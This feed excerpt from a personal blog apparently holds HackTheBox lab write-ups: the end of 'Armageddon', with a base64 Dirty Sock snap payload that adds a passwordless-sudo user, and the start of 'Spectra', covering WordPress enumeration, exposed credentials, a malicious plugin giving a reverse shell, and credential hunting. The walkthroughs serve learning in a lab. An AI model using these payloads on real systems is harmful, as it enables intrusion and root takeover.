&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python2 -c &lt;span class=&#34;s1&#34;&gt;&amp;#39;print &amp;#34;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#34; + &amp;#34;A&amp;#34; * 4256 + &amp;#34;==&amp;#34;&amp;#39;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; Doomdesire.snap
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;We now have our .snap file:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/15.png&#34; alt=&#34;Pasted image 20210724070213.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can also read the file in order to get a general idea of how it is going to work:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/16.png&#34; alt=&#34;Pasted image 20210724070337.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see that it is indeed going to add a new user called &lt;strong&gt;dirty_sock&lt;/strong&gt; and add him to the sudoers group with the permissions to run every command with sudo.&lt;/p&gt;
&lt;p&gt;The last step to exploit this, is to install our newly created .snap file:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/snap install --devmode Doomdesire.snap
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/17.png&#34; alt=&#34;Pasted image 20210724070710.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;A very important thing to note here, is that the &lt;code&gt;--devmode&lt;/code&gt; is required for this to work. As we can read from the article describing this vulnerability that is linked on the end of this writeup, snaps themselves run in sandboxes and require digital signatures matching public keys that machines already trust. However, it is possible to lower these restrictions by indicating that a snap is in development (called “devmode”). This will give the snap access to the host Operating System just as any other application would have. Now that we installed our snap, the exploit has completed and we have a new user on the box. The user&amp;rsquo;s credentials are the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Username: dirty_sock&lt;/li&gt;
&lt;li&gt;Password: dirty_sock&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Armageddon/18.png&#34; alt=&#34;Pasted image 20210724071226.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Since the user can run anything with sudo, we simply changed to the root user with &lt;code&gt;sudo su&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;useful-resources&#34;&gt;Useful Resources:&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&#34;&gt;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&lt;/a&gt;: Dirty_Sock Explained.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&#34;&gt;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&lt;/a&gt;: Drupalgeddon2 Explained.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&#34;&gt;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&lt;/a&gt;: Info about the settings.php file of Drupal.&lt;/li&gt;
&lt;/ul&gt;
</content>
            
            
            
                
                
                
                    
                    
                    
                        
                            <category scheme="https://netuserdoomdesire.github.io/posts/writeups/" term="posts\Writeups\" label="posts\Writeups\" />
                        
                    
                
            
            
            
                
                    
                
                    
                
            
        </entry>
    
        <entry>
            <title type="text">Spectra Writeup (HackTheBox)</title>
            <link rel="alternate" type="text/html" href="https://netuserdoomdesire.github.io/posts/writeups/spectra/" />
            <id>https://netuserdoomdesire.github.io/posts/writeups/spectra/</id>
            <updated>2021-06-26T19:03:12&#43;03:00</updated>
            <published>2021-06-26T10:00:00&#43;03:00</published>
            <author>
                    <name>Doomdesire</name>
                    <uri>https://netuserdoomdesire.github.io/</uri>
                    </author>
            <summary type="html">Overview Machine: https://www.hackthebox.eu/home/machines/profile/317
Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (https://www.hackthebox.eu/home/users/profile/1190). We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user.</summary>
            
                <content type="html">&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/1.png&#34; alt=&#34;Pasted image 20210623152551.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;Machine: &lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/317&#34;&gt;https://www.hackthebox.eu/home/machines/profile/317&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Spectra is an easy ChromeOS machine on HackTheBox created by egre55 (&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/1190)&#34;&gt;https://www.hackthebox.eu/home/users/profile/1190)&lt;/a&gt;. We start by enumerating a Wordpress site as well as finding exposed credentials leading to access on the Administrator panel. From there we upload a malicious wordpress plugin that gets us a shell as the nginx user. We then again find a password file, this time belonging to a normal user, making us able to login via ssh. By taking advantage of the fact that the user can execute initctl with root privileges, we run a job that enables us to run bash with SUID permissions, obtaining root access.&lt;/p&gt;
&lt;h1 id=&#34;initial-reconnaissance&#34;&gt;Initial Reconnaissance&lt;/h1&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning:&lt;/h3&gt;
&lt;p&gt;We can start with the standard nmap, scanning the default ports:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -sC -sV 10.10.10.229 -oN spectra.nmap
Starting Nmap 7.91 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2021-06-23 15:16 EDT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.229
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.081s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;997&lt;/span&gt; closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp   open  http    nginx 1.17.4
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.17.4
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
3306/tcp open  mysql   MySQL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unauthorized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-cert: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_sslv2: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-alpn: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_tls-nextprotoneg: ERROR: Script execution failed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use -d to debug&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 41.19 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;flags-used&#34;&gt;Flags used:&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;-sC: Scan with the default scripts&lt;/li&gt;
&lt;li&gt;-sV: Probe open ports to determine service/version info.&lt;/li&gt;
&lt;li&gt;-oN: Save the nmap output on the designated file in normal format.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-server&#34;&gt;Web Server&lt;/h3&gt;
&lt;p&gt;From the nmap scan we can see that an &lt;strong&gt;HTTP&lt;/strong&gt; server is hosted on port &lt;strong&gt;80&lt;/strong&gt;. HTTP servers are generally the right path to start enumerating so we visit the page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/2.png&#34; alt=&#34;Pasted image 20210623153743.png&#34;&gt;
The server appears to be used for issue tracking. By clicking around the page we see the following:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/3.png&#34; alt=&#34;Pasted image 20210623154304.png&#34;&gt;
This means the server tries to reach &lt;strong&gt;spectra.htb&lt;/strong&gt;, which is not mapped to an IP address. That in turn means we cannot continue until we edit our hosts file to map &lt;strong&gt;spectra.htb&lt;/strong&gt; to &lt;strong&gt;10.10.10.229&lt;/strong&gt; which is our target&amp;rsquo;s IP. We can do that with &lt;code&gt;nano /etc/hosts&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/4.png&#34; alt=&#34;Pasted image 20210623154645.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;first-link-wordpress-site&#34;&gt;First Link (Wordpress Site)&lt;/h3&gt;
&lt;p&gt;By saving the hosts file, we can now navigate the pages. By clicking on the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link now correctly redirects us to the following page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/5.png&#34; alt=&#34;Pasted image 20210623155726.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Some instant information we can gather is that this is a Wordpress site and that &lt;strong&gt;administrator&lt;/strong&gt; is a username we can later user in case we want to get access to it. By clicking on the &lt;strong&gt;Log in&lt;/strong&gt; link (bottom right), we get to the Wordpress login page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/6.png&#34; alt=&#34;Pasted image 20210623160559.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;There is something interesting to note here, which is a common bad practice on login pages, giving attackers the ability to validate if a username exists or not. We can see for example that trying to login with the username &lt;strong&gt;doomdesire&lt;/strong&gt; and a random password i get the following error:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/7.png&#34; alt=&#34;Pasted image 20210623161022.png&#34;&gt;
However, trying to login as &lt;strong&gt;administrator&lt;/strong&gt; and a random password i get the following error:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/8.png&#34; alt=&#34;Pasted image 20210623161152.png&#34;&gt;
which is clearly a different message from the previous one, confirming that &lt;strong&gt;administrator&lt;/strong&gt; is a valid name. Login pages should always have a consistent error message whether someone enters a valid username or not.
At this point there were some things we could try in order to maybe login such as:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Since this is a wordpress site, it&amp;rsquo;s a very good idea to run &lt;strong&gt;wpscan&lt;/strong&gt; which is a wordpress enumeration tool found here: &lt;a href=&#34;https://github.com/wpscanteam/wpscan&#34;&gt;https://github.com/wpscanteam/wpscan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Since we have a valid username we could also brute force the login page trying out multiple passwords (in general this could potentially lock out a user or/and blacklist our IP so always use with caution).&lt;/li&gt;
&lt;li&gt;We could use CeWL (&lt;a href=&#34;https://github.com/digininja/CeWL&#34;&gt;https://github.com/digininja/CeWL&lt;/a&gt;) to build a password list based on the words used on the site in order to use them for a more targeted password attack (again, be careful about lockouts/blacklists).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These are all great things to have in mind in general, however there was no success, making the wordpress site a dead end for the time being.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;second-link-test&#34;&gt;Second Link (Test)&lt;/h3&gt;
&lt;p&gt;Apart from the &lt;strong&gt;Software Issue Tracker&lt;/strong&gt; link, there was also a &lt;strong&gt;Test&lt;/strong&gt; link on the initial page, that redirects us to &lt;a href=&#34;http://spectra.htb/testing/index.php&#34;&gt;http://spectra.htb/testing/index.php&lt;/a&gt; that returns us an &lt;strong&gt;Error establishing a database connection&lt;/strong&gt; message. However, index.php is not the only file hosted on &lt;strong&gt;/testing&lt;/strong&gt;, something that can be easily confirmed by visiting &lt;a href=&#34;http://spectra.htb/testing/&#34;&gt;http://spectra.htb/testing/&lt;/a&gt; :
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/9.png&#34; alt=&#34;Pasted image 20210623162742.png&#34;&gt;
There are multiple .php files listed in this page. In general, you want to look at everything to ensure you did not miss something, however any file containing the words &amp;ldquo;&lt;strong&gt;config&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;&lt;strong&gt;login&lt;/strong&gt;&amp;rdquo; should be the first to read. Checking the &lt;strong&gt;wp-config.php.save&lt;/strong&gt; file from our browser, it seems to be empty, however by viewing the page source we see a lot of comments:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/SQL.png&#34; alt=&#34;Pasted image 20210623163534.png&#34;&gt;
including &lt;strong&gt;MySQL&lt;/strong&gt; credentials!
Note that Instead of viewing the page source we could also use &lt;code&gt;curl http://spectra.htb/testing/wp-config.php.save&lt;/code&gt; from our terminal and we would also be able to view it.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;accessing-the-wordpress-administrator-panel&#34;&gt;Accessing the Wordpress Administrator Panel&lt;/h3&gt;
&lt;p&gt;We now have a password and including the newly found username &lt;strong&gt;devtest&lt;/strong&gt; we have 2 usernames we can try on the Wordpress login page we could not access earlier. Trying with the &lt;strong&gt;devstest&lt;/strong&gt; username brings no results, however, trying with the &lt;strong&gt;administrator&lt;/strong&gt; username get&amp;rsquo;s us right in:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/11.png&#34; alt=&#34;Pasted image 20210624164217.png&#34;&gt;
Some instant information we can get is that Wordpress is out-of-date and that our version is &lt;strong&gt;5.4.2&lt;/strong&gt;. Of course we could have known this right from the start by looking for example at the page source of the login page:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/12.png&#34; alt=&#34;Pasted image 20210624163938.png&#34;&gt;
or by using the firefox extension &amp;ldquo;&lt;strong&gt;Wappalyzer&lt;/strong&gt;&amp;quot;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/13.png&#34; alt=&#34;Pasted image 20210624164029.png&#34;&gt;
The version can also be found by the previously mentioned &lt;strong&gt;wpscan&lt;/strong&gt; tool.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;getting-a-shell-as-nginx&#34;&gt;Getting a shell as nginx&lt;/h3&gt;
&lt;p&gt;Since we are on the Wordpress adminitration panel, there are some ways we can get a reverse shell. The method we are gonna use here is uploading a malicious plugin. There is a cool script we can use for this, that can be found here: &lt;a href=&#34;https://github.com/wetw0rk/malicious-wordpress-plugin&#34;&gt;https://github.com/wetw0rk/malicious-wordpress-plugin&lt;/a&gt;.
It&amp;rsquo;s usage is pretty straightforward. We are gonna run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;chmod +x wordpwn.py
./wordpwn.py 10.10.14.9 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; Y
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will first make the script executable, then create file called &amp;ldquo;&lt;strong&gt;malicious.zip&lt;/strong&gt;&amp;rdquo; that is our vulnerable plugin that we are gonna upload. The plugin is gonna get us a reverse shell on port 4444 that we declared. The &lt;code&gt;Y&lt;/code&gt; option declares that we want to automatically start a handler with metasploit:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/15.png&#34; alt=&#34;Pasted image 20210624170131.png&#34;&gt;
As our handler is waiting to receive a connection, we upload our malicious plugin by navigating to &lt;code&gt;Plugins--&amp;gt;Add New--&amp;gt;Upload Plugin--&amp;gt;Browse&lt;/code&gt; and select the &lt;strong&gt;malicious.zip&lt;/strong&gt; file we generated with the script. We then select &lt;code&gt;Install Now&lt;/code&gt; and then &lt;code&gt;Activate Plugin&lt;/code&gt;:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/16.png&#34; alt=&#34;Pasted image 20210624170543.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;As stated in the script github page, once the plugin is installed and activated, we just have to navigate to the following URLs to launch the reverse shell (we have to add the &lt;code&gt;/main&lt;/code&gt; part in the URL, which we can observe if we look the URL paths used by our target server. Not including this path will not work, since the 2 files we want to request will not be found):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/wetw0rk_maybe.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&#34;&gt;http://spectra.htb/main/wp-content/plugins/malicious/QwertyRocks.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;and we get a reverse shell:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/17.png&#34; alt=&#34;Pasted image 20210624170913.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;escalating-privileges-to-katie&#34;&gt;Escalating Privileges to Katie&lt;/h3&gt;
&lt;p&gt;At first glance we can see there is another user on the box named Katie:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cat /etc/passwd &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/18.png&#34; alt=&#34;Pasted image 20210624171438.png&#34;&gt;
If we want to get the &lt;strong&gt;user.txt&lt;/strong&gt; we have to escalate our privileges to that user. If we are going to avoid automated tools such as &lt;strong&gt;LinPeas&lt;/strong&gt;, manually searching for configuration files is one of the most standard ways to find possible user credentials, so we can search by typing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This will search for all files on the system that contain the &lt;strong&gt;.conf&lt;/strong&gt; part on their name. However running this will create a lot of noise from some folders such as &lt;strong&gt;/etc&lt;/strong&gt;, &lt;strong&gt;/mnt&lt;/strong&gt; and &lt;strong&gt;/usr&lt;/strong&gt; so we can begin by filtering them out of our command to have a more manageable output. If we find nothing after filtering them out we will start looking there too.  To filter them out we run:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;find / -name *.conf* 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -v -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/mnt/&amp;#34;&lt;/span&gt; -e &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/20.png&#34; alt=&#34;Pasted image 20210624172845.png&#34;&gt;
We notice a file named &lt;strong&gt;/opt/autologin.conf.orig&lt;/strong&gt;. Reading it, we see there is a password file on a folder named &lt;strong&gt;autologin&lt;/strong&gt; inside &lt;strong&gt;/etc&lt;/strong&gt;. Remember that we filtered out this folder! We could have easily missed it!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/21.png&#34; alt=&#34;Pasted image 20210624173246.png&#34;&gt;
Reading the &lt;strong&gt;passwd&lt;/strong&gt; file inside &lt;strong&gt;/etc/autologin/&lt;/strong&gt; we get a password:
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/22.png&#34; alt=&#34;Pasted image 20210624173626.png&#34;&gt;
The possible users to try logging in with this password are root and Katie. There was no success with root, however with Katie the credentials are valid and we can now login as her via ssh!
&lt;img src=&#34;https://netuserdoomdesire.github.io/Spectra/23.png&#34; alt=&#34;Pasted image 20210624173903.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;escalating-privileges-to-root&#34;&gt;Escalating Privileges to root&lt;/h3&gt;
&lt;p&gt;Since we are logged in as a proper user, we can now look to gain root privileges. Again, if we are going to avoid an automated tool such as &lt;strong&gt;LinPeas&lt;/strong&gt;, we want to manually search for common vulnerabilities. One of them, is granting users the ability to run all or some binaries as the root user. We can check what Katie can run as root by typing:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
